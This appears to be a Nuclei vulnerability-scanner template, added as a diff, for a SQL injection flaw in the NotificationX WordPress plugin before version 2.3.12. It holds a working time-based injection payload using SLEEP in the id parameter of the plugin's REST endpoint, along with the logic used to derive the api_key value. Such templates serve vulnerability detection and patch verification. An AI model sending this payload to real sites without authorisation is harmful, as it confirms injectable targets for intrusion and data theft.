@@ -1,0 +1,45 @@
+id: notificationx-sqli
+
+info:
+  name: NotificationX < 2.3.12 - SQL Injection
+  author: theamanrawat
+  severity: high
+  description: |
+    The plugin does not validate and escape the id parameter in its notificationx/v1/notification REST endpoint before using it in a SQL statement, which could allow unauthenticated attackers to perform SQL Injection attacks.
+  remediation: Fixed in version 2.3.12
+  reference:
+    - https://wpscan.com/vulnerability/d1480717-726d-4be2-95cb-1007a3f010bb
+    - https://wordpress.org/plugins/notificationx/
+  metadata:
+    verified: true
+    max-request: 2
+  tags: wpscan,sqli,wp,wp-plugin,wordpress,notificationx-sql-injection
+
+http:
+  - raw:
+      - |
+        GET /wp-json/ HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        @timeout: 10s
+        GET /wp-json/notificationx/v1/notification/1?api_key={{md5('{{apikey}}')}}&id[1]=%3d(SELECT/**/1/**/WHERE/**/SLEEP(6)) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+          - 'status_code == 401'
+          - 'contains(content_type, "application/json")'
+          - 'contains(body, "There is no notification created with this id")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: apikey
+        group: 1
+        regex:
+          - '"home":"(.*?)",'
+        internal: true
+
+# digest: 4b0a00483046022100f473a033b58bb46b8a4779f5d0d2ec2c6543e79bb03a99f69ee0dcf385b1266b022100cf23b383f29c180f3df37238343ed61437997b07640ffa5f62ab36c2da806b94:922c64590222798bb761d5b6d8e72950
